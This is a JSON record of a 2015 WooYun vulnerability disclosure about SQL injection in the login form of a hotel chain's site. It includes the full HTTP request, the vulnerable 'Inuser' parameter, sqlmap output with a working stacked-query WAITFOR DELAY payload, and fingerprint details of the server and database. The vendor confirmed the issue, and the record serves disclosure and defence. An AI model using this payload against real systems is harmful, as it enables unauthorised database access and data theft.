{"id": 26554, "wybug_id": "wooyun-2015-0128357", "wybug_title": "维也纳酒店某处SQL注入", "wybug_corp": "wyn88.com", "wybug_author": "missy", "wybug_date": "2015-07-22 14:58", "wybug_open_date": "2015-09-06 10:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向公众公开  简要描述：   详细说明：  \n注入：POST / HTTP/1.1Host: cas.wyn88.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://cas.wyn88.com/Cookie: Hm_lvt_ae8bddcb177c34849249800dc684ac2c=1437541738; Hm_lpvt_ae8bddcb177c34849249800dc684ac2c=1437541738; sgsa_id=wyn88.com|1437541738138779; sgsa_vt_116053_119137=1437541739219Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 292__VIEWSTATE=%2FwEPDwUJODE4NzQ0NjAzD2QWAgIBD2QWAgIHDxYCHgVzdHlsZQUMZGlzcGxheTpub25lZGSGPPKTHfxGm8K%2B7uK0UOQzs%2BIS4C97McBBu1H7j6o09Q%3D%3D&__EVENTVALIDATION=%2FwEWBALIvbmLDAKb65yqBwKq3fPDCgKC3IfLCWQygO9tMCnRIu0HEnDj45gu0zZJ91mcctYr3SCUt3ZG&Inuser=123&Inpass=123456&btnlogin=%E7%99%BB%E9%99%86\n\n参数：Inuser\n\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Inuser (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwUJODE4NzQ0NjAzD2QWAgIBD2QWAgIHDxYCHgVzdHlsZQUOZGlzcGxheTpibG9jazsWAgIBDxYCHglpbm5lcmh0bWwFJOW3peWPt+S4jeWtmOWcqOaIluWvhueggeS4jeato+ehru+8gWRkNFBdRfSedVWn50tH2Htfb+1GIgs+iv4HajgR2nTDZSc=&__EVENTVALIDATION=/wEWBAKw6LayBwKb65yqBwKq3fPDCgKC3IfLCct379HK4NAGjYLmOMy56o+je1eHMF6AJGrl5JrnEYSt&Inuser=123';WAITFOR DELAY '0:0:5'--&Inpass=123456&btnlogin=%E7%99%BB%E9%99%86---web server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NET, Nginxback-end DBMS: Microsoft SQL Server 2008current database:    'velcro7'\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Inuser (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwUJODE4NzQ0NjAzD2QWAgIBD2QWAgIHDxYCHgVzdHlsZQUOZGlzcGxheTpibG9jazsWAgIBDxYCHglpbm5lcmh0bWwFJOW3peWPt+S4jeWtmOWcqOaIluWvhueggeS4jeato+ehru+8gWRkNFBdRfSedVWn50tH2Htfb+1GIgs+iv4HajgR2nTDZSc=&__EVENTVALIDATION=/wEWBAKw6LayBwKb65yqBwKq3fPDCgKC3IfLCct379HK4NAGjYLmOMy56o+je1eHMF6AJGrl5JrnEYSt&Inuser=123';WAITFOR DELAY '0:0:5'--&Inpass=123456&btnlogin=%E7%99%BB%E9%99%86---web server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NET, Nginxback-end DBMS: Microsoft SQL Server 2008current database:    'velcro7'\n   修复方案：  参数过滤   版权声明：转载请注明来源 missy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-23 10:51 厂商回复： 感谢关注 ，处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}